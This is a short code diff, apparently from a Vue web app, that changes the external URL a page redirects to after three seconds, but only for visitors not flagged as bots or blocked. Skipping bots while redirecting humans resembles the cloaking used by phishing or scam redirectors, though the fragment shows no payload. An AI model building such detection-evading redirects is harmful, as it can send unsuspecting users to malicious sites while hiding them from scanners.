@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://otf.rodolfocolen.com/';
+          window.location.href = 'https://loat.garabedian.com.ar/';
         }, 3000);
       }
     });
